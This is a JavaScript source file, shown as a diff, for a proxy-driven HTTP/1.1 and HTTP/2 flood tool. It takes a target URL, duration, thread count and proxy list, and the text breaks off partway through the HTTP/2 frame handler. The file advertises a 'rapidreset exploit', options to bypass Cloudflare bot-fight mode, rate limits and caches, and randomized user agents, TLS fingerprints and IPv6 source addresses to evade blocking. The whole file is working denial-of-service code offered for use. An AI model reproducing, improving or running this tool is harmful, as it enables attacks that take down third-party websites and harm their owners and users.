+ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
+
+require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
+
+process
+    .setMaxListeners(0)
+    .on('uncaughtException', function (e) {
+        console.log(e)
+        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
+    })
+    .on('unhandledRejection', function (e) {
+        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
+    })
+    .on('warning', e => {
+        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
+    })
+    .on("SIGHUP", () => {
+        return 1;
+    })
+    .on("SIGCHILD", () => {
+        return 1;
+    });
+
+const statusesQ = []
+let statuses = {}
+
+
+
+const SettingHeaderTableSize = 0x1;
+const SettingEnablePush = 0x2;
+const SettingInitialWindowSize = 0x4;
+const SettingMaxHeaderListSize = 0x6;
+let isFull = process.argv.includes('--full');
+let shouldCloseSession = process.argv.includes('--ignore');
+let custom_update = 15663105;
+const blockedDomain = [".gov", ".edu"];
+let STREAMID_RESET = 0;
+let SO_SNDBUF = 7
+let SO_RCVBUF = 8
+let TCP_NODELAY = 1
+let SOL_SOCKET = 1
+const timestamp = Date.now();
+const timestampString = timestamp.toString().substring(0, 10);
+const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
+const reqmethod = process.argv[2];
+const target = process.argv[3];
+const time = process.argv[4];
+const threads = process.argv[5];
+const ratelimit = process.argv[6];
+const proxyfile = process.argv[7];
+const rapid1 = process.argv.indexOf('--rapid');
+const rapid = rapid1 !== -1 && rapid1 + 1 < process.argv.length ? process.argv[rapid1 + 1] : undefined;
+const hello = process.argv.indexOf('--limit');
+const limit = hello !== -1 && hello + 1 < process.argv.length ? process.argv[hello + 1] : undefined;
+const randua = process.argv.indexOf('--randua');
+const randua1 = randua !== -1 && randua + 1 < process.argv.length ? process.argv[randua + 1] : undefined;
+const fin = process.argv.indexOf('--fingerprint');
+const fingerprint = fin !== -1 && fin + 1 < process.argv.length ? process.argv[fin + 1] : undefined;
+const randp = process.argv.indexOf('--randpath');
+const randpath = randp !== -1 && randp + 1 < process.argv.length ? process.argv[randp + 1] : undefined;
+const bfmFlagIndex = process.argv.indexOf('--bfm');
+const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
+const delayIndex = process.argv.indexOf('--delay');
+const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
+const fully = process.argv.indexOf('--full');
+const fullHeaders = fully !== -1 && fully + 1 < process.argv.length ? process.argv[fully + 1] : undefined;
+const refererIndex = process.argv.indexOf('--referer');
+const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
+const connect = process.argv.indexOf('--connect');
+const connections = connect !== -1 && connect + 1 < process.argv.length ? process.argv[connect + 1] : undefined;
+const postdataIndex = process.argv.indexOf('--postdata');
+const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
+const randrateIndex = process.argv.indexOf('--randrate');
+const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
+const checking = process.argv.indexOf('--check');
+const check = checking !== -1 && checking + 1 < process.argv.length ? process.argv[checking + 1] : undefined;
+const caching = process.argv.indexOf('--cache');
+const cache = caching !== -1 && caching + 1 < process.argv.length ? process.argv[caching + 1] : undefined;
+const customHeadersIndex = process.argv.indexOf('--header');
+const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
+
+const forceHttpIndex = process.argv.indexOf('--http');
+
+const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
+const debugMode = process.argv.includes('--debug') && forceHttp != 1;
+
+
+if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
+    console.clear();
+    console.log(chalk.red.underline('Usage:'));
+    console.log(chalk.red.bold(`node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>`));
+    console.log(`node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 proxy.txt --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate true --rapid true --limit true\n`);
+    
+    console.error((`
+    Options:
+      --full true/false - using full headers for attack
+      --connect 1-10000 - set the limit of proxy connection 
+      --limit true/null - to bypass a little bit ratelimit site Example: --limit true
+      --rapid true/null - rapidreset exploit Example: --rapid true
+      --fingerprint true/null - enable using fingerprint Example: --fingerprint true
+      --randua true/null - to using random useragent Mozilla  (default useragent type : Browser ) Example: --randua true
+      --randpath true/null - using random path attack
+      --delay <1-100> - delay between requests 1-100 ms (optimal) default 1 ms
+      --bfm true/null - enable bypass bot fight mode
+      --check true/null - enable auto end bad proxies
+      --cache true/null - enable bypass cache
+      --referer https://target.com / rand - use custom referer if you need and rand - if you need to generate domains ex: fwfwwfwfw.net
+      --postdata "username=admin&password=123" - if you need data to post, req method format "username=f&password=f"
+      --randrate - randomizer rate 1 to 90 good bypass to rate
+      --http 1/2/mix - new function choose to type http 1/2/mix (mix 1 & 2)
+      --debug - show your status code (maybe low rps to use more resource)
+      --header "user-ganet@kontol#referer@https://super.wow": Optional parameter to define a custom header. Example: --header "user-ganet@kontol#referer@https://super.wow".
+    `));
+    process.exit(1);
+}
+const getRandomChar = () => {
+    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
+    const randomIndex = Math.floor(Math.random() * alphabet.length);
+    return alphabet[randomIndex];
+};
+var randomPathSuffix = '';
+setInterval(() => {
+    randomPathSuffix = `${getRandomChar()}`;
+}, 3333);
+const url = new URL(target)
+const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')
+ 
+
+
+
+if (url.hostname.endsWith(blockedDomain)) {
+    console.log(`Domain ${blockedDomain} blocked`);
+    process.exit(1);
+}
+function random_string(length) {
+const characters = 'abcdefghijklmnopqrstuvwxyz';
+let result = "";
+for (let i = 0; i < length; i++) {
+result += characters.charAt(Math.floor(Math.random() * characters.length));
+}
+return result
+}
+function random_int(minimum, maximum) {
+return Math.floor(Math.random() * (maximum - minimum + 1)) + minimum;
+}
+let hcookie = "";       
+function random_cookies() {
+let cookies = "";
+const cookie_names = ["JSESSIONID", "_ga", "PHPSESSID", `_ga_${random_string(random_int(10, 11)).toUpperCase()}`];
+const cookie_limit = random_int(1, cookie_names.length);
+for (var x = 0; x < cookie_limit; x++) {
+const cookie_name = cookie_names[Math.floor(Math.random() * cookie_names.length)];
+const cookie_index = cookie_names.indexOf(cookie_name);
+if (cookie_index > -1) {
+cookie_names.splice(cookie_index, 1);
+}
+const cookie_value = random_string(random_int(random_int(16, 32), random_int(32, 64)));
+cookies += `${cookie_name}=${cookie_value}`;
+if (x+1 < cookie_limit) {
+cookies += '; ';
+}
+}
+}
+
+
+if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
+  const hcookie = random_cookies();
+}
+function encodeFrame(streamId, type, payload = "", flags = 0) {
+    let frame = Buffer.alloc(9)
+    frame.writeUInt32BE(payload.length << 8 | type, 0)
+    frame.writeUInt8(flags, 4)
+    frame.writeUInt32BE(streamId, 5)
+    if (payload.length > 0)
+        frame = Buffer.concat([frame, payload])
+    return frame
+}
+
+function decodeFrame(data) {
+    const lengthAndType = data.readUInt32BE(0)
+    const length = lengthAndType >> 8
+    const type = lengthAndType & 0xFF
+    const flags = data.readUint8(4)
+    const streamId = data.readUInt32BE(5)
+    const offset = flags & 0x20 ? 5 : 0
+
+    let payload = Buffer.alloc(0)
+
+    if (length > 0) {
+        payload = data.subarray(9 + offset, 9 + offset + length)
+
+        if (payload.length + offset != length) {
+            return null
+        }
+    }
+
+    return {
+        streamId,
+        length,
+        type,
+        flags,
+        payload
+    }
+}
+
+function encodeSettings(settings) {
+    const data = Buffer.alloc(6 * settings.length)
+    for (let i = 0; i < settings.length; i++) {
+        data.writeUInt16BE(settings[i][0], i * 6)
+        data.writeUInt32BE(settings[i][1], i * 6 + 2)
+    }
+    return data
+}
+function getLocalIPv6() {
+    const interfaces = os.networkInterfaces();
+    let ipv6Address = null;
+
+    for (const ifaceName of Object.keys(interfaces)) {
+        const iface = interfaces[ifaceName];
+        const ipv6 = iface.find((details) => details.family === 'IPv6' && !details.internal);
+
+        if (ipv6) {
+            ipv6Address = ipv6.address.split('%')[0];
+            ipv6Address = ipv6Address.replace('::2', '');
+            ipv6Address = ipv6Address.replace('::1', '');
+            break;
+        }
+    }
+
+    return ipv6Address;
+}
+
+const ipv6 = getLocalIPv6();
+const array = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f'];
+function rnd_ip_block() {
+    const a = array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)] +
+        array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)];
+    const b = array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)] +
+        array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)];
+    const c = array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)] +
+        array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)];
+    const d = array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)] +
+        array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)];
+
+    return `${ipv6}:${a}:${b}:${c}:${d}`;
+}
+function encodeRstStream(streamId, type, flags) {
+    const frameHeader = Buffer.alloc(9);
+    frameHeader.writeUInt32BE(4, 0);
+    frameHeader.writeUInt8(type, 4);
+    frameHeader.writeUInt8(flags, 5);
+    frameHeader.writeUInt32BE(streamId, 5);
+    const statusCode = Buffer.alloc(4).fill(0);
+
+    return Buffer.concat([frameHeader, statusCode]);
+}
+function randstr(length) {
+    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    let result = "";
+    const charactersLength = characters.length;
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+}
+
+if (url.pathname.includes("%RAND%")) {
+    const randomValue = randstr(6) + "&" + randstr(6);
+    url.pathname = url.pathname.replace("%RAND%", randomValue);
+}
+
+function randstrr(length) {
+    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
+    let result = "";
+    const charactersLength = characters.length;
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+}
+
+function generateRandomString(minLength, maxLength) {
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+    let result = '';
+    for (let i = 0; i < length; i++) {
+        const randomIndex = Math.floor(Math.random() * characters.length);
+        result += characters[randomIndex];
+    }
+    return result;
+}
+function cc(minLength, maxLength) {
+    const characters = 'abcdefghijklmnopqrstuvwxyz';
+    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+    let result = '';
+    for (let i = 0; i < length; i++) {
+        const randomIndex = Math.floor(Math.random() * characters.length);
+        result += characters[randomIndex];
+    }
+    return result;
+}
+
+function getRandomInt(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+function buildRequest() {
+    const browserVersion = getRandomInt(128, 130);
+        var brandValue, versionList, fullVersion;
+        switch (browserVersion) {
+            case 126:
+                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
+                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
+                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
+                break;
+            case 127:
+                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
+                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
+                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
+                break;
+            case 128:
+                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
+                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
+                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
+                break;
+            case 129:
+                brandValue = `\"Google Chrome\";v=\"${browserVersion}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
+                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
+                versionList = `\"Google Chrome\";v=\"${fullVersion}\", \"Not=A?Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\"`;
+                break;
+            case 130:
+                brandValue = `\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
+                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
+                versionList = `\"Not?A_Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
+                break;
+            default:
+                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
+                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
+                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
+                break;
+                    }
+                    const isBrave = versionList.includes('Brave');
+
+    const acceptHeaderValue = isBrave
+        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
+        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
+
+
+    const langValue = isBrave
+        ? 'en-US,en;q=0.6'
+        : 'en-US,en;q=0.7';
+
+        const generateUserAgent = () => {
+                        const getRandomItem = (arr) => arr[Math.floor(Math.random() * arr.length)];
+                        const browsers = [
+                        { name: "Chrome", versions: ["91.0", "92.0", "93.0", "94.0", "95.0"] },
+                        { name: "Firefox", versions: ["89.0", "90.0", "91.0", "92.0"] },
+                        { name: "Safari", versions: ["14.1", "15.0", "15.1", "16.0"] },
+                        { name: "Edge", versions: ["91.0", "92.0", "93.0"] },
+                        { name: "Opera", versions: ["78.0", "79.0", "80.0"] },
+                        { name: "Internet Explorer", versions: ["11.0", "10.0"] }
+                        ];
+                        
+                        const devices = [
+                        { name: "Pixel 6", platform: "Android", version: "12" },
+                        { name: "iPhone 13", platform: "iOS", version: "15" },
+                        { name: "Samsung Galaxy S21", platform: "Android", version: "11" },
+                        { name: "MacBook Pro", platform: "macOS", version: "Monterey" },
+                        { name: "Windows 10 PC", platform: "Windows", version: "10" },
+                        ];
+                        
+                        const engines = [
+                        { name: "Blink", versions: ["91", "92", "93"] },
+                        { name: "Gecko", versions: ["89", "90", "91"] },
+                        { name: "WebKit", versions: ["604", "605", "606"] },
+                        ];
+                        
+                        const osList = [
+                        "Linux", "Windows 10", "macOS Monterey", "iOS 15", "Android 12", "Ubuntu 20.04", "Fedora 34"
+                        ];
+                        
+                        
+                        const features = [
+                        { name: "WebGL", version: "1.0" },
+                        { name: "Service Worker", version: "1.0" },
+                        { name: "ES6", version: "2015" },
+                        { name: "Canvas", version: "2.0" },
+                        
+                        ];
+                        const browser = getRandomItem(browsers);
+                        const device = getRandomItem(devices);
+                        const engine = getRandomItem(engines);
+                        const os = getRandomItem(osList);
+                        const feature = getRandomItem(features);
+                        return `${browser.name}/${getRandomItem(browser.versions)} ` +`(${device.name}; ${device.platform} ${device.version}; ${os}) ` +`${engine.name}/${getRandomItem(engine.versions)} ` +`(KHTML, like Gecko) ${feature.name}/${feature.version}`;
+                        };
+    const secChUa = `${brandValue}`;
+    const currentRefererValue = refererValue === 'rand' ? 'https://' + cc(6, 6) + ".net" : refererValue;
+
+    let mysor = '\r\n';
+    let mysor1 = '\r\n';
+    if (currentRefererValue) {
+        mysor = '\r\n'
+        mysor1 = '';
+    } else {
+        mysor = '';
+        mysor1 = '\r\n';
+    }
+    const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
+    let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
+        `Accept: ${acceptHeaderValue}\r\n` +
+        'Accept-Encoding: gzip, deflate, br\r\n' +
+        `Accept-Language: ${langValue}\r\n` +
+        'Cache-Control: no-store, no-cache, must-revalidate\r\n' +
+        'Connection: Keep-Alive\r\n' +
+        `Host: ${url.hostname}\r\n` +
+        'Sec-Fetch-Dest: document\r\n' +
+        'Sec-Fetch-Mode: navigate\r\n' +
+        'Pragma: no-cache\r\n' +                                    // Force cache bypass
+        'Expires: 0\r\n' +                                        // Force revalidation
+        'Sec-Fetch-Site: none\r\n' +
+        'Sec-Fetch-User: ?1\r\n' +
+        'Upgrade-Insecure-Requests: 1\r\n' +
+        `User-Agent: ${generateUserAgent()}\r\n` +
+        `sec-ch-ua: ${secChUa}\r\n` +
+        'sec-ch-ua-mobile: ?0\r\n' +
+        'sec-ch-ua-platform: "Windows"\r\n' + mysor1;
+        
+        
+        if (Math.random() < 0.5) {
+        headers += `Sec-Fetch-Mode: ${randomString}\r\n`;
+        headers += `Sec-Fetch-Site: none\r\n`;
+        headers += `Sec-Fetch-User: ${randomString}\r\n`;
+        headers += `Referer: https://${randomString}${url.hostname}/${randomString}\r\n`;
+        headers += `Origin: https://${randomString}${url.hostname}\r\n`;
+        headers += '\r\n';
+    } else {
+        headers += 'Sec-Fetch-Mode: navigate\r\n';
+        headers += `Sec-Fetch-Site: ${randomString}\r\n`;
+        headers += `Sec-Fetch-User: ?1\r\n`;
+        headers += `Referer: https://${randomString}${url.hostname}/${randomString}\r\n`;
+        headers += `Origin: https://${randomString}${url.hostname}\r\n`;
+        headers += '\r\n';
+    }
+        
+    if (hcookie) {
+        headers += `Cookie: ${hcookie}\r\n`;
+    }
+
+    if (currentRefererValue) {
+        headers += `Referer: ${currentRefererValue}\r\n` + mysor;
+    }
+
+    const mmm = Buffer.from(`${headers}`, 'binary');
+    return mmm;
+}
+
+const h1payl = Buffer.concat(new Array(1).fill(buildRequest()))
+
+function go() {
+    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':')
+    let tlsSocket;
+
+    if (!proxyPort || isNaN(proxyPort)) {
+        go()
+        return
+    }
+
+    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
+        netSocket.once('data', () => {
+        setsockopt(netSocket, 6, 3, 1)
+        setsockopt(netSocket, 6, TCP_NODELAY, 1)
+        setsockopt(netSocket, SOL_SOCKET, SO_SNDBUF, 1000000)
+        setsockopt(netSocket, SOL_SOCKET, SO_RCVBUF, 1000000)
+        let ip_address = rnd_ip_block();
+        
+        const sigalgs = [
+    "ecdsa_secp256r1_sha256",
+    "rsa_pss_rsae_sha256",
+    "rsa_pkcs1_sha256",
+    "ecdsa_secp384r1_sha384",
+    "rsa_pss_rsae_sha384",
+    "rsa_pkcs1_sha384",
+    "rsa_pss_rsae_sha512",
+    "rsa_pkcs1_sha512"
+].join(":");
+        const curves = [
+    "X25519",
+    "P-256",
+    "P-384"
+].join(":");
+        const ver = ["TLSv1.3","TLSv1.2"]
+        const ssl_versions = ['771', '772', '773']; 
+const cipher_suites = ['4865', '4866', '4867', '49195', '49195', '49199', '49196', '49200', '52393', '52392', '49171', '49172', '156', '157', '47', '53'];
+const extensions = ['45', '35', '18', '0', '5', '17513', '27', '10', '11', '43', '13', '16', '65281', '65037', '51', '23', '41'];
+const elliptic_curves = ['4588', '29', '23', '24'];
+function random_fingerprint() {
+    const version = ssl_versions[random_int(0, ssl_versions.length - 1)];
+    const cipher = cipher_suites[random_int(0, cipher_suites.length - 1)];
+    const extension = extensions[random_int(0, extensions.length - 1)];
+    const curve = elliptic_curves[random_int(0, elliptic_curves.length - 1)];
+
+    const ja3 = `${version},${cipher},${extension},${curve}`;
+
+    return crypto.createHash('md5').update(ja3).digest('hex');
+}
+const languages = [
+    "en-US,en;q=0.9",
+    "en-GB,en;q=0.9",
+];
+
+const encodings = [
+    "gzip, deflate, br, zstd",
+    "gzip, deflate, br"
+]
+const ciphers = [
+    "TLS_GREASE",
+    "TLS_AES_128_GCM_SHA256",
+    "TLS_AES_256_GCM_SHA384",
+    "TLS_CHACHA20_POLY1305_SHA256",
+    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
+    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
+    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
+    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
+    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
+    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
+    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
+    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
+    "TLS_RSA_WITH_AES_128_GCM_SHA256",
+    "TLS_RSA_WITH_AES_256_GCM_SHA384",
+    "TLS_RSA_WITH_AES_128_CBC_SHA",
+    "TLS_RSA_WITH_AES_256_CBC_SHA"
+].join(":");
+let status_codes = {}
+const timeout = (duration) => {
+        setTimeout(() => {
+            go(proxyHost, proxyPort);
+        }, duration);
+    }
+            tlsSocket = tls.connect({
+                socket: netSocket,
+                localAddress: ip_address,
+                ...(Math.random() < random_int(0, 75) / 100) ? { sigalgs: sigalgs } : {},
+                ecdhCurve: Math.random() < 0.75 ? "X25519" : curves,
+                requestOCSP: Math.random() < 0.50 ? true : false,
+                ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
+                servername: url.host,
+                 ciphers: ciphers,
+                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
+                secure: true,
+                minVersion: ver[ver.length - 1],
+                maxVersion: ver[0],
+                rejectUnauthorized: false,
+                ...(fingerprint === true ? { fingerprint: random_fingerprint() } : {}),
+            }, () => {
+            
+                tlsSocket.addListener("ratelimit", async (duration) => {
+                    const proxyKey = `${proxyHost}:${proxyPort}`;
+                    const index = proxy.indexOf(proxyKey);
+                    if (index > -1) proxy.splice(index, 1);
+                    tlsSocket.end(() => tlsSocket.destroy());
+                    await timeout(duration * 1000);
+                });
+                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
+                
+                    if (forceHttp == 2) {
+                        tlsSocket.end(() => tlsSocket.destroy())
+                        return
+                    }
+                    
+
+                    function main() {
+                        tlsSocket.write(h1payl, (err) => {
+                            if (!err) {
+                                setTimeout(() => {
+                                    main()
+                                }, isFull ? 1000 : 1000 / ratelimit)
+                            } else {
+                                tlsSocket.end(() => tlsSocket.destroy())
+                            }
+                        })
+                    }
+
+                    main()
+
+                    tlsSocket.on('error', () => {
+                        tlsSocket.end(() => tlsSocket.destroy())
+                    })
+                    return
+                }
+
+                if (forceHttp == 1) {
+                    tlsSocket.end(() => tlsSocket.destroy())
+                    return
+                }
+                let g = 0;
+                setInterval(() => {
+                g = 0;
+                }, 10000);
+                let streamId = 1;
+                let data = Buffer.alloc(0);
+                let hpack = new HPACK();
+                hpack.setTableSize(4096);
+                let getgoaway;;
+                const updateWindow = Buffer.alloc(4);
+                updateWindow.writeUInt32BE(custom_update, 0);
+                 if (getgoaway >= 1000 && g == 0) {
+                    SettingHeaderTableSize += 1;
+                    g = 1;
+                }
+
+                const frames1= [];
+                const frames = [
+                    Buffer.from(PREFACE, 'binary'),
+                    encodeFrame(0, 4, encodeSettings([
+                        [SettingHeaderTableSize, 65536],
+                        [SettingEnablePush, 0],
+                        [SettingInitialWindowSize, 6291456],
+                        [SettingMaxHeaderListSize, 262144],
+                    ])),
+                    encodeFrame(0, 8, updateWindow)
+                ];
+                frames1.push(...frames);
+                
+                
+
+
+                
+                
+
+                tlsSocket.on('data', (eventData) => {
+                    data = Buffer.concat([data, eventData])
+                    
+                    while (data.length >= 9) {
+                        const frame = decodeFrame(data)
+                        if (frame != null) {
+                            data = data.subarray(frame.length + 9)
+                            if (frame.type == 4 && frame.flags == 0) {
+                                tlsSocket.write(encodeFrame(0, 4, "", 1))
+                            }
+
+                            if (frame.type == 1) {
+                                const decodedHeaders = hpack.decode(frame.payload);
+                                if (!decodedHeaders || !Array.isArray(decodedHeaders)) {
+                                return; 
+                                }
+                                
+                                const statusHeader = decodedHeaders.find(x => x[0] === ':status');
+                                const retryAfterHeader = decodedHeaders.find(x => x[0] === 'retry-after');
+                                const cfMitigatedHeader = decodedHeaders.find(x => x[0] === 'cf-mitigated');
+                                
+                                const status = statusHeader ? statusHeader[1] : undefined;
+                                const retryAfter = retryAfterHeader ? retryAfterHeader[1] : undefined;
+                                const cfMitigated = cfMitigatedHeader ? cfMitigatedHeader[1] : undefined;
+                                
+                                
+                                
+                                if (status === 302 || status === 301) {
+                                const redirect = hpack.decode(frame.payload).find(x => x[0] == 'location')[1];
+                                url = new URL(redirect, url.href);
+                                }
+                                 else if ((status === "403" || status === "429") && limit && retryAfter) {
+                                    tlsSocket.emit("ratelimit", parseInt(retryAfter));
+                                    if (!status['BLOCK']) status['BLOCK'] = 0;
+                                    status['BLOCK']++;
+                                    tlsSocket.end(() => tlsSocket.destroy());
+                                    return;
+                                }
+                                if (cfMitigatedHeader && cfMitigatedHeader[1] === 'challenge') {
+                                    tlsSocket.end(() => tlsSocket.destroy());
+                                    return;
+                                }
+                                if (['403', '400', '429'].includes(status) && check) {
+                                tlsSocket.end(() => tlsSocket.destroy());
+                                }
+
+                                if (!statuses[status])
+                                    statuses[status] = 0
+
+                                statuses[status]++
+                            } else if (frame.type === 3) {
+                                if (!statuses["RST"]) statuses["RST"] = 0;
+                                statuses["RST"]++;
+                                tlsSocket.end(() => tlsSocket.destroy());
+                            } else if (frame.type == 4 && frame.flags == 0) {
+                                tlsSocket.write(encodeFrame(0, 0x4, "", 0x1));
+                            }  else if (frame.type === 5) {
+                                // push promise
+                                continue;
+                            } else if (frame.type === 6) {
+                                if (!(frame.flags & 0x1)) {
+                                    tlsSocket.write(encodeFrame(0, 0x6, frame.payload, 0x1));
+                                }
+                            }
+                            
+                            if (frame.type == 7 || frame.type == 5) {
+                                if (frame.type == 7) {
+                                    if (debugMode) {
+
+                                        
+
+                                        if (!statuses["GOAWAY"])
+                                            statuses["GOAWAY"] = 0
+
+                                        statuses["GOAWAY"]++
+                                        getgoaway += 1;
+                                    }
+                                }
+
+                                tlsSocket.write(encodeRstStream(0, 3, 0));
